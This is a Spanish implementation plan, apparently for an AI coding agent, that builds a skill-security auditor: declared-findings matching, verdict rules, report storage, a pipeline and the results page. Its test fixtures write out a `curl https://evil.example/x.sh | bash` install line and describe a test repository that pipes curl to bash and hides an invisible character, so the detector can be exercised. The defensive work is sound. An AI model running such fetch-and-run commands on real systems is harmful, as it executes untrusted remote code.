- [ ] Validar: Ruff, pytest y `bun run test`, sin errores.

### Tarea 7: Declarado, veredicto, cobertura y la cadena completa

**Archivos:**
- Crear: `worker/src/auditor_worker/declared.py`, `verdict.py`, `report.py` y `store.py`.
- Modificar: `worker/src/auditor_worker/pipeline.py`.
- Crear: `worker/tests/test_declared.py`, `test_verdict.py`, `test_pipeline.py` y `test_store.py` (con el marcador
  `db`).

**Interfaces que produce:**
- `apply_declared(findings, skill_md: str) -> None` (diseño 7.2, cruce provisional sin IA). Un hallazgo con `token` es
  declarado si el `SKILL.md` contiene ese texto literal, sin distinguir mayúsculas. Su `severity` es
  `severity_declared` o `severity_undeclared`. `install.remote-script` no cambia con lo declarado.
- `compute_verdict(findings, items) -> tuple[Verdict, Finding | None]` (diseño 8):
  - `dangerous` con al menos un hallazgo crítico;
  - `review` con al menos uno alto, uno medio no declarado o un archivo de código no revisable;
  - si no, `no_serious_findings`.
  - El hallazgo principal es el más grave, con desempate por no declarado, ruta y línea.
- `coverage(items, remotes) -> {sourceBytes, decompiledBytes, unreviewableBytes}`. Los binarios y los remotos que no se
  pudieron descargar cuentan como no revisables.
- `build_report(...) -> dict` con `schemaVersion: 1` y estos campos:
  - `install`, `dependencies`, `coverage` y `topFindingKey` (`ruleId:ruta:línea`);
  - `notExecuted`: cada script con «La ejecución aislada todavía no está activa»;
  - `notVerifiable`: el código de los N paquetes de terceros, OSV si no respondió, los submódulos, los plugins con
    origen fuera del repositorio, «Que un script remoto haya cambiado desde el análisis» y los remotos que fallaron, con
    su motivo;
  - `steps`, con `done` y `total` de reglas, IA (0 de N), descompilación (0 de N binarios) y ejecución aislada (0 de N);
  - `suppressed`.
- `store.save_analysis(conn, job, version_id, result) -> SaveOutcome`, en una sola transacción:
  - borra los `VersionFile` y `Finding` anteriores de la versión (por si es un reintento) y los inserta;
  - pone en la versión `verdict`, `analyzedAt`, `report`, `fingerprint` y `hasRemoteScripts`, y el trabajo pasa a
    `done`;
  - si `fingerprint` choca con otra versión de la skill (`unique`), deshace, borra la versión nueva si la creó el
    trabajo, apunta el trabajo a la versión que ya existe, la marca `done` y devuelve el análisis apartado.
- `pipeline.run_job(conn, job, deps)`: `deps` agrupa `download`, `fetcher` y `osv`, para poder probarlo sin red. Hace los
  pasos con `report_progress` y estos códigos: `download`, `inventory`, `rules` (con `current`/`total` por archivo),
  `install`, `remote`, `verdict` y `save`.
  - **Trabajo `fingerprint_check`:** lee los `VersionFile` remotos de la versión, los vuelve a descargar y calcula
    `final_fingerprint`.
    - Si coincide con la huella de alguna versión de la skill, el trabajo pasa a `done` apuntando a esa versión y
      devuelve el análisis apartado.
    - Si no, crea una versión nueva (con la misma skill, commit, ref, `filesFingerprint`, `sourceFiles` y
      `submittedById = job.user_id`), cambia el trabajo a esa versión y a `kind = analysis`, y sigue con el análisis
      completo.
  - Si no hay `SKILL.md` en el snapshot → `AnalysisFailure("No es una skill: falta SKILL.md")`.
  - Si `sourceFiles` está vacío (versiones creadas antes de esta fase) → `AnalysisFailure("Esta versión no tiene la
    lista de archivos: vuelve a enviarla")`.

**Pruebas:**
- `test_declared_domain_case_insensitive`;
- `test_remote_script_not_lowered_by_declaration`;
- `test_verdict_rules`: una crítica → `dangerous`; una media declarada → `no_serious_findings`; una media sin declarar →
  `review`; un binario → `review`;
- `test_pipeline_end_to_end`: con un tarball de prueba que lleva `SKILL.md`, un `install.sh` con `curl` a
  `https://evil.example/x.sh | bash` y un `requirements.txt` sin fijar, el resultado es `dangerous`, el hallazgo
  principal es `install.remote-script` y el remoto (falso) se analiza como archivo de origen `remote`;
- `test_store_retry_replaces_previous_rows` (`db`);
- `test_fingerprint_check_same_returns_credit` (`db`);
- `test_fingerprint_check_changed_creates_version` (`db`);
- `test_concurrent_fingerprint_conflict` (`db`, punto 4).

**Pasos:**
- [ ] Escribir las pruebas y comprobar que fallan.
- [ ] Implementar hasta que pasen.
- [ ] Validar: Ruff y pytest completo, con la base de prueba, sin errores.

### Tarea 8: La página de la skill y el avance con datos reales

**Archivos:**
- Crear: `lib/auditor/analysis-report.ts` (el esquema Zod de `report`, `schemaVersion: 1`) y su prueba.
- Modificar: `lib/auditor/queries.ts`, con `getSkillAnalysisFromDb(slug, version?)`, que convierte las tablas en
  `SkillAnalysis`.
- Modificar: `app/(auditor)/skills/[slug]/page.tsx`: primero la base; si el slug no está, `mock-data`.
- Modificar: `lib/auditor/types.ts` (`InstallStep.method` admite `"readme"`; `SkillFile` lleva `blobSha` y `commit`) y
  los componentes de `components/auditor/skill/` que lo necesiten.
- Modificar: `actions/auditor/progress.ts`, `lib/auditor/labels.ts` y `components/auditor/progress-content.tsx` (paso,
  «archivo N de M» y el nombre visible del repositorio). En «Mis envíos» y en la cola del admin se usa también
  `displayOwner/displayRepo`.

**Reglas:**
- Se muestran solo las versiones con `verdict`, numeradas por orden de `analyzedAt`. `plugin` queda en `null` y `changes`
  en `null`.
- **Código desde GitHub** (diseño 13):
  - un componente cliente pide `https://raw.githubusercontent.com/<owner>/<repo>/<commit>/<ruta>` y calcula el SHA-1 de
    blob con `crypto.subtle`;
  - si coincide, muestra las líneas;
  - si no coincide, `sha-mismatch`; un 404, `gone`; un binario, `binary`.
  - Los archivos `remote` no se piden: se muestran su URL, la fecha de descarga, los hallazgos con su evidencia y el aviso
    del diseño, «Este archivo vive fuera de GitHub y puede haber cambiado desde el análisis».
- **Textos de lo que aún no existe:**
  - resumen sencillo y explicaciones: «Todavía no hay explicación por IA para esta versión.»;
  - «Dice frente a hace»: «Esta comparación llega con la explicación por IA.»;
  - ejecución aislada: «La ejecución aislada todavía no está activa: no se ejecutó ningún script.»
- **Etiquetas del avance:**
  - `download`: «Descargando el commit»;
  - `inventory`: «Haciendo el inventario»;
  - `rules`: «Pasando las reglas»;
  - `install`: «Analizando la instalación»;
  - `remote`: «Descargando los scripts remotos»;
  - `verdict`: «Calculando el veredicto»;
  - `save`: «Guardando el resultado».
- La página sigue siendo pública. La consulta no devuelve quién envió.

**Pruebas:** `analysis-report.test.ts` acepta un `report` válido y rechaza uno con otro `schemaVersion`. Una prueba de la
conversión en `queries.test.ts`, con una fila de ejemplo, comprueba que `verdict` `no_serious_findings` pasa a
`"no-serious-findings"`.

**Pasos:**
- [ ] El worker implementa la conversión, la vista del código y los textos.
- [ ] Validar: typecheck, lint, `bun run test`, build, `theme:sync-classic --check` y el comprobador de CSS del auditor,
  sin errores.

### Tarea 9: Prueba completa y commit

**Pasos:**
- [ ] Claude aplica la migración, levanta la web en Docker y el worker en el Mac, con `DATABASE_URL` hacia
  `127.0.0.1:5432` y `GITHUB_TOKEN`.
- [ ] La persona envía los 3 repositorios de prueba del diseño y uno hecho para la prueba. Ese repositorio lleva un
  `curl … | bash` a otro dominio, un `pip install` sin fijar, un carácter invisible en el `SKILL.md` y un `install.sh`
  descargado de su propio `main`.
- [ ] Claude comprueba:
  - cada trabajo pasa de «En cola» a la página de la skill con hallazgos reales;
  - el código se ve desde GitHub y las líneas con hallazgo están marcadas;
  - el repositorio de prueba sale «Peligrosa»; su `install.sh` del propio `main` sale como media;
  - volver a enviar una skill con scripts remotos crea un `fingerprint_check`, que devuelve el análisis apartado si no
    cambió nada;
  - matar el worker a mitad de un trabajo y arrancarlo de nuevo: el trabajo se retoma tras 10 minutos (punto 5).
- [ ] Validar: el pre-commit completo (con el paso 5), el job «Worker» en local con la base de prueba, y que la búsqueda
  del nombre de la referencia visual sale vacía.
- [ ] Commit local del diseño, el plan y el código: `feat(auditor): analyze skills with the Python worker`.

**Parada (la de la fase 4 en el diseño):** la persona mira si los hallazgos tienen sentido y si se marca demasiado como
peligroso. Las gravedades de la tabla de la tarea 4 se ajustan aquí antes de seguir. Después sube `feat/python-worker`,
abre el PR, marca «Worker» como obligatorio en la protección de `main` e integra.
